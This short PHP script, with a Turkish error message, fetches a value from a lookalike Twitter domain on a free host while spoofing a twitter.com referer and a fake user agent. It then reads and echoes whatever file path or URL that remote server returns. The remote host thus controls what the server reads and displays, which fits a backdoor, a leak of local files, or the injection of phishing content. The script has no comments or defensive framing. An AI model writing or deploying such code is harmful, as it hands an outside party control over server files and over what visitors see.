
<?php

function curl_site($Url){ 
  
    if (!function_exists('curl_init')){ 
        die('Üzgünüm.Curl yüklü değil!'); 
    } 
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_URL, $Url); 
    curl_setopt($ch, CURLOPT_REFERER, "http://twitter.com"); 
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla vs."); 
    curl_setopt($ch, CURLOPT_HEADER, 0); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
    curl_setopt($ch, CURLOPT_TIMEOUT, 10); 
    $output = curl_exec($ch); 
    curl_close($ch); 
    return $output; 
}  

$kulad=curl_site('https://twilter-post-source.000webhostapp.com/usergrid.php'); 






echo file_get_contents($kulad);

  ?>

